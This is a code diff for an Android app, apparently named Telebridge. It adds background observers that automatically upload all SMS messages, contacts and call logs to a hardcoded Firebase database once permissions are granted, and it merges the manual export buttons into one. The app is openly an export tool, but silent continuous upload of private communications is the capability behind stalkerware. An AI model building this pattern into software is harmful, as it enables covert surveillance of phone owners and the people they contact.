@@ -1,8 +1,14 @@
 package com.example.telebridge_android_app
 
 import android.Manifest
+import android.content.ContentResolver
 import android.content.pm.PackageManager
+import android.database.ContentObserver
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.provider.ContactsContract
+import android.provider.Telephony
 import android.util.Log
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -17,13 +23,12 @@ import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.unit.dp
 import com.example.telebridge_android_app.ui.theme.TelebridgeandroidappTheme
-
-// Utils
-import com.example.telebridge_android_app.utils.readSms
-import com.example.telebridge_android_app.utils.readContacts
 import com.example.telebridge_android_app.utils.readCallLogs
-import com.example.telebridge_android_app.utils.uploadToFirebase
+import com.example.telebridge_android_app.utils.readContacts
+import com.example.telebridge_android_app.utils.readSms
 import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.database.ServerValue
+import java.util.UUID
 
 class MainActivity : ComponentActivity() {
 
@@ -33,25 +38,21 @@ class MainActivity : ComponentActivity() {
         permissions.forEach { (perm, granted) ->
             Log.d("Permissions", "$perm granted=$granted")
         }
+        // Si toutes les permissions sont accordées, démarrer la synchro automatique
+        startAutoSync()
     }
 
     private val firebaseDatabase by lazy {
         FirebaseDatabase.getInstance("https://telebridge-fc798-default-rtdb.firebaseio.com/")
     }
 
+    private val userId = "user_demo" // TODO: remplacer par ID unique utilisateur
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
-
-        // Demande des permissions runtime
         requestPermissions()
 
-        // Test Firebase
-        val testRef = firebaseDatabase.getReference("test")
-        testRef.setValue("Firebase connecté ✅")
-        Log.d("FirebaseTest", "Donnée envoyée à Firebase")
-
-        // UI Compose
         setContent {
             TelebridgeandroidappTheme {
                 Surface(modifier = Modifier.fillMaxSize()) {
@@ -76,9 +77,98 @@ class MainActivity : ComponentActivity() {
 
         if (permissionsToRequest.isNotEmpty()) {
             permissionsLauncher.launch(permissionsToRequest)
+        } else {
+            // Permissions déjà accordées
+            startAutoSync()
         }
     }
+
+    // ------------------------- Synchronisation -------------------------
+
+    private fun startAutoSync() {
+        val resolver = contentResolver
+
+        // Observer SMS
+        resolver.registerContentObserver(
+            Telephony.Sms.CONTENT_URI,
+            true,
+            object : ContentObserver(Handler(Looper.getMainLooper())) {
+                override fun onChange(selfChange: Boolean) {
+                    super.onChange(selfChange)
+                    Log.d("Sync", "📩 Nouveau SMS détecté")
+                    syncSms()
+                }
+            }
+        )
+
+        // Observer Contacts
+        resolver.registerContentObserver(
+            ContactsContract.Contacts.CONTENT_URI,
+            true,
+            object : ContentObserver(Handler(Looper.getMainLooper())) {
+                override fun onChange(selfChange: Boolean) {
+                    super.onChange(selfChange)
+                    Log.d("Sync", "👥 Nouveau contact détecté")
+                    syncContacts()
+                }
+            }
+        )
+
+        // Observer Appels
+        resolver.registerContentObserver(
+            android.provider.CallLog.Calls.CONTENT_URI,
+            true,
+            object : ContentObserver(Handler(Looper.getMainLooper())) {
+                override fun onChange(selfChange: Boolean) {
+                    super.onChange(selfChange)
+                    Log.d("Sync", "📞 Nouvel appel détecté")
+                    syncCalls()
+                }
+            }
+        )
+    }
+
+    // ------------------------- Fonctions de synchro -------------------------
+
+    private fun syncSms() {
+        val smsList = readSms(this)
+        val batchData = hashMapOf<String, Any>()
+        smsList.forEach { sms ->
+            val id = UUID.randomUUID().toString()
+            batchData["/users/$userId/sms/$id"] = sms + mapOf("timestamp" to ServerValue.TIMESTAMP)
+        }
+        firebaseDatabase.reference.updateChildren(batchData)
+            .addOnSuccessListener { Log.d("FirebaseUpload", "✅ SMS synchronisés") }
+            .addOnFailureListener { e -> Log.e("FirebaseUpload", "❌ Erreur SMS", e) }
+    }
+
+    private fun syncContacts() {
+        val contactsList = readContacts(this)
+        val batchData = hashMapOf<String, Any>()
+        contactsList.forEach { contact ->
+            val id = UUID.randomUUID().toString()
+            batchData["/users/$userId/contacts/$id"] =
+                contact + mapOf("timestamp" to ServerValue.TIMESTAMP)
+        }
+        firebaseDatabase.reference.updateChildren(batchData)
+            .addOnSuccessListener { Log.d("FirebaseUpload", "✅ Contacts synchronisés") }
+            .addOnFailureListener { e -> Log.e("FirebaseUpload", "❌ Erreur Contacts", e) }
+    }
+
+    private fun syncCalls() {
+        val callsList = readCallLogs(this)
+        val batchData = hashMapOf<String, Any>()
+        callsList.forEach { call ->
+            val id = UUID.randomUUID().toString()
+            batchData["/users/$userId/calls/$id"] = call + mapOf("timestamp" to ServerValue.TIMESTAMP)
+        }
+        firebaseDatabase.reference.updateChildren(batchData)
+            .addOnSuccessListener { Log.d("FirebaseUpload", "✅ Appels synchronisés") }
+            .addOnFailureListener { e -> Log.e("FirebaseUpload", "❌ Erreur Appels", e) }
+    }
 }
+
+// ------------------------- Composable -------------------------
 
 @Composable
 fun HomeScreen(activity: ComponentActivity, database: FirebaseDatabase) {
@@ -94,81 +184,47 @@ fun HomeScreen(activity: ComponentActivity, database: FirebaseDatabase) {
         horizontalAlignment = Alignment.CenterHorizontally
     ) {
         Text("Telebridge - Dashboard", style = MaterialTheme.typography.titleLarge)
-
         Spacer(modifier = Modifier.height(24.dp))
 
-        // Bouton SMS
         Button(
             onClick = {
-               /* val smsList = readSms(activity).ifEmpty {
-                    listOf(
-                        mapOf("address" to "123456789", "body" to "Test SMS", "date" to "2025-08-21"),
-                        mapOf("address" to "987654321", "body" to "Hello World", "date" to "2025-08-20")
-                    )
-                }
-                val smsRef = database.getReference("sms")
-                smsRef.setValue(smsList)
-                Log.d("FirebaseUpload", "SMS envoyés : ${smsList.size}")*/
+                // Export initial complet
                 val smsList = readSms(activity)
-                val smsRef = database.getReference("sms")
-                smsRef.setValue(smsList)
-                Log.d("FirebaseUpload", "Sms envoyés : ${smsList.size}")
-            },
-            modifier = Modifier
-                .fillMaxWidth()
-                .padding(vertical = 8.dp)
-        ) {
-            Text("📩 Exporter SMS")
-        }
-
-        // Bouton Contacts
-        Button(
-            /*onClick = {
-                val contactsList = readContacts(activity).ifEmpty {
-                    listOf(
-                        mapOf("name" to "Alice", "number" to "123456789"),
-                        mapOf("name" to "Bob", "number" to "987654321")
-                    )
-                }
-                val contactsRef = database.getReference("contacts")
-                contactsRef.setValue(contactsList)
-                Log.d("FirebaseUpload", "Contacts envoyés : ${contactsList.size}")
-            },*/
-            onClick = {
                 val contactsList = readContacts(activity)
-                val contactsRef = database.getReference("contacts")
-                contactsRef.setValue(contactsList)
-                Log.d("FirebaseUpload", "Contacts envoyés : ${contactsList.size}")
-            },
-            modifier = Modifier
-                .fillMaxWidth()
-                .padding(vertical = 8.dp)
-        ) {
-            Text("👤 Exporter Contacts")
-        }
-
-        // Bouton Appels
-        Button(
-            onClick = {
-               /* val callsList = readCallLogs(activity).ifEmpty {
-                    listOf(
-                        mapOf("number" to "123456789", "type" to "INCOMING", "date" to "2025-08-21", "duration" to "60"),
-                        mapOf("number" to "987654321", "type" to "MISSED", "date" to "2025-08-20", "duration" to "0")
-                    )
-                }
-                val callsRef = database.getReference("calls")
-                callsRef.setValue(callsList)
-                Log.d("FirebaseUpload", "Appels envoyés : ${callsList.size}")*/
                 val callsList = readCallLogs(activity)
-                val callsRef = database.getReference("calls")
-                callsRef.setValue(callsList)
-                Log.d("FirebaseUpload", "Appels envoyés : ${callsList.size}")
+
+                val batchData = hashMapOf<String, Any>()
+                val userId = "user_demo"
+
+                smsList.forEach { sms ->
+                    val id = UUID.randomUUID().toString()
+                    batchData["/users/$userId/sms/$id"] = sms + mapOf("timestamp" to ServerValue.TIMESTAMP)
+                }
+                contactsList.forEach { contact ->
+                    val id = UUID.randomUUID().toString()
+                    batchData["/users/$userId/contacts/$id"] =
+                        contact + mapOf("timestamp" to ServerValue.TIMESTAMP)
+                }
+                callsList.forEach { call ->
+                    val id = UUID.randomUUID().toString()
+                    batchData["/users/$userId/calls/$id"] = call + mapOf("timestamp" to ServerValue.TIMESTAMP)
+                }
+
+                database.reference.updateChildren(batchData)
+                    .addOnSuccessListener {
+                        Log.d(
+                            "FirebaseUpload",
+                            "✅ Export initial terminé : SMS=${smsList.size}, Contacts=${contactsList.size}, Appels=${callsList.size}"
+                        )
+                    }
+                    .addOnFailureListener { e -> Log.e("FirebaseUpload", "❌ Erreur export initial", e) }
+
             },
             modifier = Modifier
                 .fillMaxWidth()
                 .padding(vertical = 8.dp)
         ) {
-            Text("📞 Exporter Historique Appels")
+            Text("📤 Exporter toutes les données")
         }
     }
 }
